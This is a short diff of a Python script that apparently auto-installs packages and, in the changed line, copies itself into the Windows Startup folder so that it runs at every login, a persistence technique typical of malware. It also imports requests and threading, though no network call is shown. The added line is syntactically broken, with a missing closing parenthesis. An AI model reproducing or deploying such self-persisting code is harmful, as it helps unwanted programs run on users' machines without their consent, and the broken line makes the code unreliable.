@@ -18,7 +18,7 @@ for package in packages:
     import_or_install(package)
 
 import shutil, os, sys
-shutil.copy(sys.argv[0], os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup', os.path.basename(sys.argv[0])))
+shutil.copy(sys.argv[0], os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup\main.py')
 
 import threading, requests
 
